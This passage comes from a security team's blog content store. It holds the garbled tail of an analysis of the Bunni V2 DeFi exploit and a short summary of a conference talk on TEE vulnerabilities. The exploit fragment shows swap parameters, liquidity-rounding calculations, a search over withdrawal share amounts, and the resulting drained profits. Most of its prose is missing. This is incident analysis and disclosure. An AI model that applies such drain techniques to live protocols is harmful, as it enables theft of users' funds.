class=\"line\">\u003Cspan>tick: 839189, ~2.78e36 USDT per USDC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>sqrtPriceLimitX96: 4295128740, tick limit: -887272 (TickMath.MIN_TICK)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 5 \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914142352010.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914142352010&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> swap 5  exactOut  swap 4 USDT99%\u003Cstrong> totalLiquidityEstimate0  totalLiquidity  token0  totalLiquidityEstimate1 \u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>totalLiquidityEstimate0 =updatedBalance0 * 2**96 / totalDensity0X96= 237684487542793012780631851008\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>totalLiquidityEstimate1 =balance1 * 2**96 / totalDensity1X96= 10647207614202720\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>result: totalLiquidityEstimate1 &#x3C; totalLiquidityEstimate0\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> \u003Cstrong>LiquidityEstimate 16%\u003C/strong> swap 5  token0USDC USDT \u003C/p>\n\u003Cp> 5.03177409645e11 USDC  2.885864344623e12 USDT swap  1.332132228158e12 USDC  1.04145399071e12 USDT 2.3m \u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ol>\n\u003Ch2 id=\"\">\u003C/h2>\n\u003Cul>\n\u003Cli>\n\u003Cp> eth  lp \u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>swap 1  totalLiquidityEstimate0  totalLiquidityEstimate1 USDTtoken1sqrtPriceLimitX96 token1  rawBalance1 totalLiquidityEstimate1\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp> withdraw shares  python  withdrawal  shares  withdrawal \u003C/p>\n\u003Cp> shares \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>205400000000 (19, 12)\t\t\t331300000000 (19, 11)\t\t\t\t457200000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>205500000000 (19, 12)\t\t\t331400000000 (19, 11)\t\t\t\t457300000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>205600000000 (19, 12)\t\t\t331500000000 (19, 11)\t\t\t\t457400000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>205700000000 (19, 12)\t\t\t331600000000 (19, 11)\t\t\t\t457500000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>205800000000 (19, 12)\t\t\t331700000000 (19, 11)\t\t\t\t457600000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>205900000000 (19, 12)\t\t\t331800000000 (19, 11)\t\t\t\t457700000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206000000000 (19, 12)\t\t\t331900000000 (19, 11)\t\t\t\t457800000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206100000000 (19, 12)\t\t\t332000000000 (19, 11)\t\t\t\t457900000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206200000000 (19, 12)\t\t\t332100000000 (19, 11)\t\t\t\t458000000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206300000000 (19, 12)\t\t\t332200000000 (19, 11)\t\t\t\t458100000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206400000000 (19, 12)\t\t\t332300000000 (19, 11)\t\t\t\t458200000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206500000000 (19, 12)\t\t\t332400000000 (19, 11)\t\t\t\t458300000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>206600000000 (19, 12)\t\t\t332500000000 (19, 11)\t\t\t\t458400000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                          332600000000 (19, 11)\t\t\t\t458500000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                          357800000000 (19, 15)\t\t\t\t458600000000 (19, 11)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                                                 \t\t\t483700000000 (19, 15)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>                                                 \t\t\t483800000000 (19, 15)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> withdraw abs(deltaActiveBalance)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan> 205400000000 (19, 12) : shares  205400000000, 19  withdrawal  12  withdrawal  1\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003Cli>\n\u003Cp> activeBalance0  2  200k  activeBalance0  2 \u003C/p>\n\u003Cp>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>withdrawSharesAmount: 205900000000, iter: 42, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>withdrawSharesAmount: 331600000000, iter: 44, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>withdrawSharesAmount: 457700000000, iter: 46, profit: 1.509580494886e12 usdc + 1.04145398069e12 usdt\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003C/li>\n\u003C/ul>",{"headings":162,"localImagePaths":175,"remoteImagePaths":176,"frontmatter":177,"imagePaths":181},[163,165,167,169,171,173],{"depth":107,"slug":164,"text":164},"",{"depth":117,"slug":166,"text":166},"",{"depth":107,"slug":168,"text":168},"",{"depth":117,"slug":170,"text":170},"",{"depth":117,"slug":172,"text":172},"",{"depth":107,"slug":174,"text":174},"",[150,151,152,153,154,155,156],[],{"draft":14,"title":140,"snippet":140,"image":178,"publishDate":179,"category":144,"author":84,"tags":180},{"src":157,"alt":140},"2025-09-22 08:00",[144,146],[150,151,152,153,154,155,156],"2025-09-22-BunniV2-Exploit-Analysis.md","2025-12-18-tee-research",{"id":183,"data":185,"body":197,"filePath":198,"assetImports":199,"digest":201,"rendered":202,"legacyId":231},{"draft":14,"title":186,"snippet":187,"image":188,"publishDate":191,"author":84,"category":192,"tags":193},"Bridging the Gap: Security World Vulnerability Discovery Across Diverse Chip Architectures","TEE Vulnerability",{"src":189,"alt":190},"__ASTRO_IMAGE_/src/assets/blog_img/2025-12-18/tee.png","TEE",["Date","2025-12-18T03:00:00.000Z"],"research",[194,195,196],"tee","vulnerability","chip architecture","## Introduction\n\nIn the modern mobile security landscape, the Trusted Execution Environment (TEE) is the \"last bastion\" protecting core privacy and cryptographic assets. However, as chip vendors (Qualcomm, MediaTek, Samsung, etc.) diverge in their TEE implementations, this bastion is not as impenetrable as it seems. At POC 2025/KanxueSDC 2025, our researchers [Dawuge](https://x.com/wugedbl) and [HBh25Y](https://x.com/HBh25Y) presented their latest findings, diving deep into the vulnerabilities hidden within the fragmented TEE ecosystem.\n\n### Architectural Diversity: The Root of Security Logic\n\nThe core of our research lies in a cross-platform analysis of how different vendors define their \"Security Boundaries.\" We compared the memory isolation schemes and Secure Monitor call flows across major chipsets, revealing how fundamental design philosophies can create unique attack surfaces.\n\n### Universal vs. Implementation-Specific Vulnerabilities\n\nOur discovery process focused on core modules like Fingerprint, SecFace, and mPOS:\n\n**Universal Vulnerabilities**: We identified common logical flaws across all architectures stemming from industry-wide misconceptions in sensitive business logic (e.g., biometric template verification).\n\n**Implementation-Specific Vulnerabilities**: Beyond TEE OS kernel differences, the TA (Trusted Application) and TEE Driver implementations vary significantly across chips. This \"same function, different code\" reality breeds unique buffer overflows and privilege escalation risks specific to certain vendors.\n\n### Breaking Boundaries: Blockchain Wallets & Knox Hardware\n\nWe extended our research to high-value targets:\n\n**Blockchain Wallet Security**: By analyzing TEE-resident wallet TAs, we demonstrated how minor flaws in data parsing or Secure Storage interactions could lead to unauthorized private key access or signature tampering.\n\n**Knox Chip Attack Path**: For the Samsung Knox architecture, we mapped a sophisticated attack chainstarting from a non-secure world application, leveraging TA flaws to penetrate the TEE Driver, and ultimately achieving physical access control of the Knox hardware chip.\n\n## Conclusion\n\nThrough this cross-architecture research, we have helped vendors patch critical risks and established a systematic methodology for TEE security research. As chip technology evolves, understanding these implementation differences remains key to future defense.\n\nGet in Touch: If you are interested about TEE security, or other security research, feel free to contact us at [shuffleteam](mailto:shuffleteam@163.com) or [here](https://x.com/ShuffleTeam_AI). \n\n## Resources:\n\nSlides: [Download PDF](https://powerofcommunity.net/2025/slide/j-8096a.pdf)","src/content/blog/2025-12-18-Tee-Research.md",[200],"/src/assets/blog_img/2025-12-18/tee.png","2b71623f9f1ad9ec",{"html":203,"metadata":204},"\u003Ch2 id=\"introduction\">Introduction\u003C/h2>\n\u003Cp>In the modern mobile security landscape, the Trusted Execution Environment (TEE) is the last bastion protecting core privacy and cryptographic assets. However, as chip vendors (Qualcomm, MediaTek, Samsung, etc.) diverge in their TEE implementations, this bastion is not as impenetrable as it seems. At POC 2025/KanxueSDC 2025, our researchers \u003Ca href=\"https://x.com/wugedbl\">Dawuge\u003C/a> and \u003Ca href=\"https://x.com/HBh25Y\">HBh25Y\u003C/a> presented their latest findings, diving deep into the vulnerabilities hidden within the fragmented TEE ecosystem.\u003C/p>\n\u003Ch3 id=\"architectural-diversity-the-root-of-security-logic\">Architectural Diversity: The Root of Security Logic\u003C/h3>\n\u003Cp>The core of our research lies in a cross-platform analysis of how different vendors define their Security Boundaries. We compared the memory isolation schemes and Secure Monitor call flows across major chipsets, revealing how fundamental design philosophies can create unique attack surfaces.\u003C/p>\n\u003Ch3 id=\"universal-vs-implementation-specific-vulnerabilities\">Universal vs. Implementation-Specific Vulnerabilities\u003C/h3>\n\u003Cp>Our discovery process focused on core modules like Fingerprint, SecFace, and mPOS:\u003C/p>\n\u003Cp>\u003Cstrong>Universal Vulnerabilities\u003C/strong>: We identified common logical flaws across all architectures stemming from industry-wide misconceptions in sensitive business logic (e.g., biometric template verification).\u003C/p>\n\u003Cp>\u003Cstrong>Implementation-Specific Vulnerabilities\u003C/strong>: Beyond TEE OS kernel differences, the TA (Trusted Application) and TEE Driver implementations vary significantly across chips. This same function, different code reality breeds unique buffer overflows and privilege escalation risks specific to certain vendors.\u003C/p>\n\u003Ch3 id=\"breaking-boundaries-blockchain-wallets--knox-hardware\">Breaking Boundaries: Blockchain Wallets &#x26; Knox Hardware\u003C/h3>\n\u003Cp>We extended our research to high-value targets:\u003C/p>\n\u003Cp>\u003Cstrong>Blockchain Wallet Security\u003C/strong>: By analyzing TEE-resident wallet TAs, we demonstrated how minor flaws in data parsing or Secure Storage interactions could lead to unauthorized private key access or signature tampering.\u003C/p>\n\u003Cp>\u003Cstrong>Knox Chip Attack Path\u003C/strong>: For the Samsung Knox architecture, we mapped a sophisticated attack chainstarting from a non-secure world application, leveraging TA flaws to penetrate the TEE Driver, and ultimately achieving physical access control of the Knox hardware chip.\u003C/p>\n\u003Ch2 id=\"conclusion\">Conclusion\u003C/h2>\n\u003Cp>Through this cross-architecture research, we have helped vendors patch critical risks and established a systematic methodology for TEE security research. As chip technology evolves, understanding these implementation differences remains key to future defense.\u003C/p>\n\u003Cp>Get in Touch: If you are interested about TEE security, or other security research, feel free to contact us at \u003Ca href=\"mailto:shuffleteam@163.com\">shuffleteam\u003C/a> or \u003Ca href=\"https://x.com/ShuffleTeam_AI\">here\u003C/a>.\u003C/p>\n\u003Ch2 id=\"resources\">Resources:\u003C/h2>\n\u003Cp>Slides: \u003Ca href=\"https://powerofcommunity.net/2025/slide/j-8096a.pdf\">Download PDF\u003C/a>\u003C/p>",{"headings":205,"localImagePaths":224,"remoteImagePaths":225,"frontmatter":226,"imagePaths":230},[206,209,212,215,218,221],{"depth":107,"slug":207,"text":208},"introduction","Introduction",{"depth":117,"slug":210,"text":211},"architectural-diversity-the-root-of-security-logic","Architectural Diversity: The Root of Security Logic",{"depth":117,"slug":213,"text":214},"universal-vs-implementation-specific-vulnerabilities","Universal vs. Implementation-Specific Vulnerabilities",{"depth":117,"slug":216,"text":217},"breaking-boundaries-blockchain-wallets--knox-hardware","Breaking Boundaries: Blockchain Wallets & Knox Hardware",{"depth":107,"slug":219,"text":220},"conclusion","Conclusion",{"depth":107,"slug":222,"text":223},"resources","Resources:",[],[],{"draft":14,"title":186,"snippet":187,"image":227,"publishDate":228,"category":192,"author":84,"tags":229},{"src":200,"alt":190},"2025-12-18 11:00",[194,195,196],[],"2025-12-18-Tee-Research.md"]